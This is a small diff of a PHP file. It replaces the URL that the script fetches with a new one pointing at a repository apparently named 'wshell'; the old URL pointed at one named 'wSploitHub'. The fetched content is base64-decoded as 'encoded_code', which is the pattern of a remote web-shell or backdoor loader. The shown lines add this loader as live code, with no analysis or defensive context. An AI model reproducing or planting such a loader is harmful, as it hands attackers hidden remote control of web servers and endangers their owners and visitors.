@@ -12,7 +12,7 @@ function get_contents($url) {
     return $result;
 }
 
-$url = 'https://git.warceuproject.org/syn/wSploitHub/raw/commit/c90159b0c2c51feefebfbf4f288b13ca3c011acb/raw/geck2';
+$url = 'https://raw.githubusercontent.com/jabarzad/wshell/refs/heads/main/api/v2/domba';
 $encoded_code = get_contents($url);
 $decoded_code = base64_decode($encoded_code);
 
